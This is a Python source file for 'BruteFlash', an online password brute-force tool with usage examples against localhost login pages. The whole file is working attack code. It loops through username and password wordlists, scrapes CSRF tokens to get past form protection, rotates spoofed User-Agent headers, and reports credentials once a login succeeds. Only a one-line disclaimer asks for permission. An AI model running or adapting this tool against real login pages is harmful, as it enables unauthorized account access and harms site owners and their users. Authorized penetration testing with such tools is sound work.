"""
Coded By Alexis Pondo
Github: http://github.com/alexispondo/
Linkedin: https://www.linkedin.com/in/alexis-pondo/
Note: Use this tool on websites that you own or with the permission of the website owner, I am in no way responsible for anything you do with it.
Usage:
- For Simple login page (without csrf token)
$  python3 BruteFlash.py -u http://127.0.0.1/Web/con.php -l user -P passwords.txt --user username --passw passw --submit submit -e "Désolé" -v

- For Secure login page (with csrf token)
$ python3 BruteFlash.py -u http://127.0.0.1:8000/admin/ -l admin -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -v

- For Secure login page (with csrf token & Cookies)
$ python3 BruteFlash.py -u  http://127.0.0.1:8000/admin2/ -l admin2 -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -C "security: high, PHPSESSID: nbkttnti5kikvru5a4etei6oq8" -v
"""
import argparse
import sys
from datetime import datetime
import os
from pathlib import Path
import requests
import random
from requests.sessions import Session
from threading import Thread
from bs4 import BeautifulSoup as Soup

User_Agent = ['Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14A346 Safari/E7FBAF', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1']

# Color Code
Black = "\u001b[30m"
Red = "\u001b[31m"
Green = "\u001b[32m"
Bold_Green = "\u001b[1;92m"
Yellow = "\u001b[33m"
Blue = "\u001b[34m"
Magenta = "\u001b[35m"
Cyan = "\u001b[36m"
White = "\u001b[37m"
Reset = "\u001b[0m"
Underline = "\u001b[4m"
Flashing = "\033[5m"
#"\033[5mTitle of the Program\033[0m"
###################################################################


# Exit function with message
exit_err =  lambda x: sys.exit(Red+str(x)+Reset)
exit_success =  lambda x: sys.exit(Green+str(x)+Reset)
###################################################################


# Display banner
def banner():
    infos = """
[+] Name: BruteFlash
[+] Version: v1.0.0
[+] Github: https://github.com/alexispondo/
[+] Linkedin: https://www.linkedin.com/in/alexis-pondo/
"""

    ban1 ="""

 d8b                                          ,d8888b d8b                    d8b      
 ?88                           d8P            88P'    88P                    ?88      
  88b                       d888888P       d888888P  d88                      88b     
  888888b   88bd88b?88   d8P  ?88'   d8888b  ?88'    888   d888b8b   .d888b,  888888b 
  88P `?8b  88P'  `d88   88   88P   d8b_,dP  88P     ?88  d8P' ?88   ?8b,     88P `?8b
 d88,  d88 d88     ?8(  d88   88b   88b     d88       88b 88b  ,88b    `?8b  d88   88P
d88'`?88P'd88'     `?88P'?8b  `?8b  `?888P'd88'        88b`?88P'`88b`?888P' d88'   88b

                              ==============================                                                      
                              === by Alexis PONDO @pkaba ===                                                
                              ==============================                                                       

"""+infos+"""
"""
    return ban1

# Get file encoding
def get_encoding(file):
    try:
        import magic
        return magic.Magic(mime_encoding=True).from_file(file)
    except:
        return "utf-8" # By default
###################################################################


# Convert file to list
def file_to_list(file):
    try:
        encoding = get_encoding(file) # We get encoding of file
        with open(file, "r", encoding=encoding, errors="ignore") as line: # We open file with encoding
            lines = [i.split("\n")[0] for i in line.readlines()] # add all line of file in the list call lines
        return lines # return list
    except Exception as e:
        exit_err(str(e)) # if error return it
###################################################################

# Create logins list
def list_of_login(login_data):
    try:
        if login_data[0] == "log_val": # if we have entered -l for login value
            return [login_data[1]] # convert this value un list with one object
        else:
            return file_to_list(login_data[1]) # else (we have entered -L) we convert file to list
    except Exception as e:
        exit_err(str(e)) # if error return it
###################################################################

# Create passwords list
def list_of_password(password_data):
    try:
        if password_data[0] == "pass_val": # if we have entered -p for password value value
            return [password_data[1]]  # convert this value un list with one object
        else:
            return file_to_list(password_data[1]) # else (we have entered -P) we convert file to list
    except Exception as e:
        exit_err(str(e)) # if error return it
###################################################################

# Search csrf value in text returned
def search_value_csrf(text, csrf):
    s = Soup(text, "html.parser") # we get html text
    csrf_token = s.findAll(attrs={"name": csrf})[0].get('value') # we search csrf name and return his value
    return csrf_token
###################################################################



# Global brutforce function
def brute_force(url, method, login_data:list, password_data:list, input_user, input_pass, input_csrf, input_submit, error_return, cookies, verbose):
    global csrf_value, found # Glabal variable
    found = False # We initialize found at false

    # Brute force fonction with csrf, and method POST
    def attaque_post_csrf(url, l, p, session: Session, cookies):
        global csrf_value, found # Global variable
        payload = { # payloads
            input_user: l, # input name of username
            input_pass: p, # input name of password
            input_submit: "Connexion", # input name of submit
            input_csrf: csrf_value # input name of csrf
        }

        ok = "no" # We initialize ok at no
        j = 0 # We initialize j at 0
        while ok == "no":
            j = j + 1 # we add one at j
            try: # Try to connect
                with session.post(url=url, data=payload, cookies=cookies, headers=header) as rep: # we use session to send request to try to connect
                    if error_return not in rep.text: # if we are connected
                        found = True # found begin true
                        print(Cyan+Flashing+"*************************** Found !!!! ***************************"+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset) # print username
                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset) # print password
                        print(Cyan+Flashing+"******************************************************************"+Reset)
                    else: # else
                        csrf_value = search_value_csrf(rep.text, input_csrf) # we search csrf value
                    ok = "yes" # ok begin "yes
            except Exception as e: # if we can't connect
                print("try again") # we try again
            if j == 4: # we stop at 4
                print("can not use it")
                ok = "yes"
    ###################################################################

    # Brute force fonction without csrf, and method POST
    def attaque_post_nocsrf(url, l, p, session: Session, cookies):
        global csrf_value, found
        payload = {
            input_user: l,
            input_pass: p,
            input_submit: "Connexion",
        }

        ok = "no"
        j = 0
        while ok == "no":
            j = j + 1
            try:
                with session.post(url=url, data=payload, cookies=cookies, headers=header) as rep:
                    if error_return not in rep.text:
                        found = True
                        print(Cyan+Flashing+"*************************** Found !!!! ***************************"+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset)
                        print(Cyan+Flashing+"******************************************************************"+Reset)
                    ok = "yes"
            except Exception as e:
                print("try again")
            if j == 4:
                print("can not use it")
                ok = "yes"
    ###################################################################

    # Brute force fonction with csrf, and method GET
    def attaque_get_csrf(url, l, p, session: Session, cookies):
        global csrf_value, found
        payload = {
            input_user: l,
            input_pass: p,
            input_submit: "Login",
            input_csrf: csrf_value
        }

        ok = "no"
        j = 0
        while ok == "no":
            j = j + 1
            try:
                with session.get(url=url, params=payload, cookies=cookies, headers=header) as rep:
                    if error_return not in rep.text:
                        found = True
                        print(Cyan+Flashing+"*************************** Found !!!! ***************************"+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset)
                        print(Cyan+Flashing+"******************************************************************"+Reset)
                    else:
                        csrf_value = search_value_csrf(rep.text, input_csrf)
                    ok = "yes"
            except Exception as e:
                print("try again")
            if j == 4:
                print("can not use it")
                ok = "yes"
    ###################################################################

    # Brute force fonction without csrf, and method GET
    def attaque_get_nocsrf(url, l, p, session: Session, cookies):
        global csrf_value, found
        payload = {
            input_user: l,
            input_pass: p,
            input_submit: "Connexion",
        }

        ok = "no"
        j = 0
        while ok == "no":
            j = j + 1
            try:
                with session.get(url=url, params=payload, cookies=cookies, headers=header) as rep:
                    if error_return not in rep.text:
                        found = True
                        print(Cyan+Flashing+"*************************** Found !!!! ***************************"+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset)
                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset)
                        print(Cyan+Flashing+"******************************************************************"+Reset)
                    ok = "yes"
            except Exception as e:
                print("try again")
            if j == 4:
                print("can not use it")
                ok = "yes"
    ###################################################################

    session = requests.session() # We initialize our session
    header = {'User-Agent': random.choice(User_Agent)} # We use one user-agent

    if cookies == None: # if we have note entered -C
        cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies)) # We search cookie
    try:
        r0 = session.get(url, cookies=cookies) # we send our first request
    except Exception as e:
        exit_err(str(e)) # if error we return it

    if input_csrf != None: # if we have entered --csrf
        try:
            csrf_value = search_value_csrf(r0.text, input_csrf) # we search csrf value
        except IndexError: # we return error
            exit_err("[!] Error --csrf : Please check if your csrf token name is correct or if your login page use csrf token protection")

        list_log = list_of_login(login_data) # we get list of login
        list_pass = list_of_password(password_data) # we get list of password
        k = 0 # We initialize k at 0
        for p in list_pass: # for each password
            for l in list_log: # For each username
                k += 1 # we add 1 at k
                if verbose: # if we have entered -v
                    print(Yellow + "Attempt " + str(k) + "- Login: " + l + " Password: " + p + Reset) # we print attempt
                if method == "POST": # if we used POST method, we send attaque with thread
                    #attaque_post_csrf(url, l, p, session, cookies)
                    t = Thread(target=attaque_post_csrf, args=(url, l, p, session, cookies,))
                    t.start()
                    t.join()
                else: # if we used GET method, we send attaque with thread
                    #attaque_get_csrf(url, l, p, session, cookies)
                    t = Thread(target=attaque_get_csrf, args=(url, l, p, session, cookies,))
                    t.start()
                    t.join()
                if found: # if corrects credentials is founded
                    if k == 1: # if correct credentials is attempt 1, it can maybe error
                        print(Magenta+""""Warning!!!: 
this may be a fake, if it is the case it is probably that the following parameters are not correct:
-u, --user, --passw, --submit, --csrf, -e or -C if you are used cookie 
Please change them and use the correct information""")
                        sys.exit("Exit..." + Reset)
                    ending = str(datetime.now()).split(".")[0] # print ending
                    print("""====================================================================================
""" + ending + """ Ending BruteForcing
====================================================================================
""")
                    sys.exit(Blue+"Exit..."+Reset)
    else: # if we have not entered --csrf
        list_log = list_of_login(login_data)
        list_pass = list_of_password(password_data)
        k = 0
        for p in list_pass:
            for l in list_log:
                k += 1
                if verbose:
                    print(Yellow + "Attempt " + str(k) + "- Login: " + l + " Password: " + p + Reset)
                if method == "POST":
                    #attaque_post_nocsrf(url, l, p, session, cookies)
                    t = Thread(target=attaque_post_nocsrf, args=(url, l, p, session, cookies,))
                    t.start()
                    t.join()
                else:
                    #attaque_get_nocsrf(url, l, p, session, cookies)
                    t = Thread(target=attaque_get_nocsrf, args=(url, l, p, session, cookies,))
                    t.start()
                    t.join()
                if found:
                    if k == 1:
                        print(Magenta+""""Warning!!!: 
this may be a fake, if it is the case it is probably that the following parameters are not correct:
-u, --user, --passw, --submit, -e or -C if you are used cookie
Please change them and use the correct information""")
                        sys.exit("Exit..." + Reset)
                    ending = str(datetime.now()).split(".")[0]
                    print("""====================================================================================
""" + ending + """ Ending BruteForcing
====================================================================================
""")
                    sys.exit(Blue+"Exit..."+Reset)
    ending = str(datetime.now()).split(".")[0]
    print("""====================================================================================
"""+Red+""")-: Correct credentials not found :-("""+Reset+"""
""" + ending + """ Ending BruteForcing
====================================================================================
""")
###################################################################


# Parser
parser = argparse.ArgumentParser(usage= """
- For Simple login page (without csrf token)
>>> python3 BruteFlash.py -u http://127.0.0.1/Web/con.php -l user -P passwords.txt --user username --passw passw --submit submit -e "Désolé" -v

- For Secure login page (with csrf token)
>>> python3 BruteFlash.py -u http://127.0.0.1:8000/admin/ -l admin -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -v

- For Secure login page (with csrf token & Cookies)
>>> python3 BruteFlash.py -u  http://127.0.0.1:8000/admin2/ -l admin2 -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -C "security: high, PHPSESSID: nbkttnti5kikvru5a4etei6oq8" -v\n """,
    description="Online bruteforce tool")


parser.add_argument("-u", type=str, required=True, help="Login URL")
parser.add_argument("-m", type=str, required=False, help="Methode Used GET/POST (Default POST)")

parser.add_argument("-l", type=str, required=False, help="username/email value")
parser.add_argument("-L", type=str, required=False, help="Wordlist path of username/email values")

parser.add_argument("-p", type=str, required=False, help="password value")
parser.add_argument("-P", type=str, required=False, help="Wordlist path of password values")

parser.add_argument("--user", type=str, required=True, help="Name parameter of username/email input")
parser.add_argument("--passw", type=str, required=True, help="Name parameter of password input")
parser.add_argument("--submit", type=str, required=False, help="Name parameter of submit input")
parser.add_argument("--csrf", type=str, required=False, help="Name parameter of csrf_token input")
parser.add_argument("-e", type=str, required=True, help="Error return for bad credential")
parser.add_argument("-C", type=str, required=False, help="Cookies ex: \"param1:value1, param2:value2\"")
parser.add_argument("-v", action='store_true', help="Allow to display attempt in terminal output")

args = parser.parse_args()
###################################################################


# Check url and return correct url or error
def get_url(url, cookies):
    try:
        with requests.session().get(url, cookies=cookies) as response: # we send get request
            result = response.status_code
        if result not in range(200,300): # we check if status code is success
            exit_err("[!] Error -u: "+url+" not found")

        if str(response.url) != url: # if we have redirected
            exit_err("[!] Error -u: Your url "+url+" is redirected at "+str(response.url)+"\nPlease Enter correct url. If this is not the problem, you should may be entered cookies to confirm that you are authorized")
        return url
    except Exception as e:
        exit_err(str(e))
###################################################################

# Check method and return correct method or error
def get_method(method):
    if method == None:
        return "POST"
    elif str(method).upper() == "GET":
        return "GET"
    elif str(method).upper() == "POST":
        return "POST"
    else:
        exit_err("[!] Error -m: parameter should be GET or POST")
###################################################################

# get login
def get_login(login_value, LOGIN_FILE):
    if login_value == None and LOGIN_FILE == None: # if we have not entered login data
        exit_err("[!] Error login: -l or -L are required")
    elif login_value != None and LOGIN_FILE != None: # if have entered -l and -L
        exit_err("[!] Error login: Only one of -l or -L is required, not the both in the same time")
    else:
        if login_value != None:
            return ["log_val", str(login_value)] # we return key "log_val" and login value
        elif LOGIN_FILE != None:
            if Path(LOGIN_FILE).is_file():
                return ["log_file", os.path.abspath(str(LOGIN_FILE))] # we return key "log file" and full path of login file
            else:
                exit_err("[!] Error -L: Login path file not found")
###################################################################

# get password
def get_password(password_value, PASSWORD_FILE):
    if password_value == None and PASSWORD_FILE == None:
        exit_err("[!] Error password: -p or -P are required")
    elif password_value != None and PASSWORD_FILE != None:
        exit_err("[!] Error password: Only one of -p or -P is required, not the both in the same time")
    else:
        if password_value != None:
            return ["pass_val", str(password_value)]
        elif PASSWORD_FILE != None:
            if Path(PASSWORD_FILE).is_file():
                return ["pass_file", os.path.abspath(str(PASSWORD_FILE))]
            else:
                exit_err("[!] Error -P: Password path file not found")
###################################################################

# get cookie
def get_cookie(cookie):
    if cookie == None:
        return None
    else:
        try: # we convert cookie form in dictionary
            cookie = str(cookie).split(",")
            dic = {}
            for c in cookie:
                c = c.split(":")
                dic[c[0].strip()] = c[1].strip()
            return dic
        except Exception as e:
            exit_err("[!] Error -C : cookies format is not correct.\nThe right format should be like: \"param1:value1, param2:value2\"")
###################################################################


# Main program
def main():
    print(Yellow+banner()+Reset) # print banner

    url = get_url(args.u, get_cookie(args.C)) # get correct url
    login_data = get_login(args.l, args.L) # get login data
    password_data =get_password(args.p, args.P) # get password data
    method = get_method(args.m) # get method
    user = args.user # get input name of username
    passw = args.passw # get input name of password
    submit = args.submit # get input name of submit
    csrf = args.csrf # get input name of csrf token
    error_returned = args.e # get error returned
    cookies = get_cookie(args.C) # get cookie
    verbose = args.v # get verbose ?

    print("""
====================================================================================
                BruteFlash v1.0.0 By Alexis PONDO (@pkaba)
====================================================================================
[+] url:                        """+str(url)+"""
[+] method:                     """+str(method)+"""
[+] login data:                 """+str(login_data[1])+"""
[+] password data:              """+str(password_data[1])+"""
[+] username input:             """+str(user)+"""
[+] password input:             """+str(passw)+"""
[+] submit input:               """+str(submit)+"""
[+] csfr input:                 """+str(csrf)+"""
[+] error returned:             """+str(error_returned)+"""
[+] cookies:                    """+str(cookies)+"""
[+] verbose:                    """+str(verbose))
    starting = str(datetime.now()).split(".")[0]
    print("""====================================================================================
"""+starting+""" Starting BruteForcing...
====================================================================================
""")
    try: # launch attack
        brute_force(url=url,method=method,login_data=login_data,password_data=password_data,input_user=user,
                input_pass=passw, input_submit=submit,input_csrf=csrf,error_return=error_returned, cookies=cookies, verbose=verbose)
    except KeyboardInterrupt as e:
        sys.exit("\nExit...")
try:
    main()
except KeyboardInterrupt as e:
    sys.exit("\nExit...")
###################################################################